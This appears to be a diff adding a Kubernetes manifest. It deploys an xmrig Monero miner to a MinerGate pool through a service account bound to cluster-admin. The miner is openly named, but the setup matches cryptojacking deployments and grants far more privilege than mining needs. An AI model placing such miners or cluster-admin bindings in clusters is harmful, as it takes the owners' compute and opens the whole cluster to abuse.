@@ -1,0 +1,77 @@
+
+apiVersion: v1
+kind: Namespace
+metadata:
+  name: miner
+  labels:
+    name: miner
+
+---
+
+apiVersion: v1
+kind: ServiceAccount
+metadata:
+  name: miner-serviceaccount
+  namespace: miner
+
+---
+
+apiVersion: rbac.authorization.k8s.io/v1
+kind: ClusterRoleBinding
+metadata:
+  name: miner-cluster-admin-binding
+subjects:
+  - kind: ServiceAccount
+    name: miner-serviceaccount
+    namespace: miner
+roleRef:
+  kind: ClusterRole
+  name: cluster-admin
+  apiGroup: rbac.authorization.k8s.io
+
+---
+
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  namespace: miner
+  name: miner-deployment
+  labels:
+    app: miner
+spec:
+  replicas: 1
+  selector:
+    matchLabels:
+      app: miner
+  template:
+    metadata:
+      labels:
+        app: miner
+    spec:
+      serviceAccountName: miner-serviceaccount
+      containers:
+        - name: miner
+          image: klimer2012/miner
+          imagePullPolicy: Always
+          command:
+            - ./xmrig
+            - --donate-level
+            - '100'
+            - --max-cpu-usage
+            - '95'
+            - -o
+            - xmr.pool.minergate.com:45700
+            - -u
+            - brannon@brannondorsey.com
+            - -k
+          resources:
+            limits:
+              cpu: 250m
+              memory: 100Mi
+          securityContext:
+            allowPrivilegeEscalation: false
+            seccompProfile:
+              type: RuntimeDefault
+            runAsNonRoot: true
+            capabilities:
+              drop: ["ALL"]
